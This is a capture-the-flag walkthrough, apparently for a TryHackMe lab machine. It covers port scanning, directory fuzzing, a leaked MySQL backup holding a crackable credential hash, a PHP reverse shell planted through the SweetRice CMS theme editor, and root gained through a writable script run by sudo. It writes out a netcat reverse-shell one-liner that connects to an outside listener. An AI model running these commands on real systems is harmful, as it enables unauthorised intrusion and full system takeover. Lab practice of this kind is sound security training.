## MACHINE IP
```bash
10.201.21.88
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Sun Sep 28 20:22:34 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.21.88
Nmap scan report for 10.201.21.88
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 28 20:23:38 2025 -- 1 IP address (1 host up) scanned in 64.20 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
## RECON
```bash
# Operating System         // Found post initial enumeration
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu
# Credentials              // Found post initial enumeration
manager:Password123 
```
## ENUMERATION
```bash
# Port 80 Enumeration
- Fuzzing
sudo feroxbuster -w /usr/share/wordlists/dirb/common.txt -C 404 -o fuzz/feroxbuster-common.txt -t 20 -u $url/
####################] - 71s     4614/4614    65/s    http://10.201.21.88/ 
[####################] - 69s     4614/4614    67/s    http://10.201.21.88/content/ 
[####################] - 1s      4614/4614    7941/s  http://10.201.21.88/content/_themes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s      4614/4614    1935/s  http://10.201.21.88/content/_themes/default/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 68s     4614/4614    68/s    http://10.201.21.88/content/as/ 
[####################] - 1s      4614/4614    8066/s  http://10.201.21.88/content/attachment/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s      4614/4614    5303/s  http://10.201.21.88/content/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s      4614/4614    2056/s  http://10.201.21.88/content/inc/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s      4614/4614    2219/s  http://10.201.21.88/content/inc/cache/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s      4614/4614    6897/s  http://10.201.21.88/content/inc/mysql_backup/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s      4614/4614    2220/s  http://10.201.21.88/content/inc/lang/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s      4614/4614    695/s   http://10.201.21.88/content/inc/font/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s      4614/4614    3070/s  http://10.201.21.88/content/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s      4614/4614    8066/s  http://10.201.21.88/content/as/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s      4614/4614    2213/s  http://10.201.21.88/content/as/lib/ => Directory listing (add --scan-dir-listings to scan)            

# Found File and Creds on the file   
- http://10.201.21.88/content/inc/mysql_backup/ 
wget http://10.201.21.88/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql

strings mysql_bakup_20191129023059-1.5.1.sql| less

# Creds 
\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\

manager:42f749ade7f9e195bf475f37a44cafcb

# Cracking hashes - crackstation
42f749ade7f9e195bf475f37a44cafcb:Password123

manager:Password123

# Using creds on Login page  - http://10.201.21.88/content/as/

# Found RCE Exploit - Reference 
https://github.com/p0dalirius/Awesome-RCE-techniques/tree/master/Content-Management-Systems-(CMS)/SweetRice/techniques/Modify-theme-to-include-php-code

```
## INITIAL SHELL
```bash
- Access http://10.201.21.88/content/as/
- Now access the theme-editor in "Theme" at http://10.201.21.88/content/as/?type=theme
- Edit the php code of home page template to php-reverse-shell.php from /usr/share/laudanum/php/php-reverse-shell.php
- Edit lhost lport
- Start Listener  
- Access http://10.201.21.88/content/_themes/default/main.php

sudo nc -nvlp 80                                                                                                                            
[sudo] password for kali: 
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.21.88] 33154
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 18:27:22 up 39 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## PRIVILEGE ESCALATION
```bash
www-data@THM-Chal:/$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

www-data@THM-Chal:/$ ls -la /home/itguy/backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
www-data@THM-Chal:/$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

www-data@THM-Chal:/$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

- File with with write permission
- Edit the lhost and lport
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.80.25 80 >/tmp/f
```
## ROOT | ADMINISTRATOR - PWNED
```bash
www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory

sudo nc -nvlp 80                                                                                                                            
[sudo] password for kali: 
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.21.88] 33156
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```
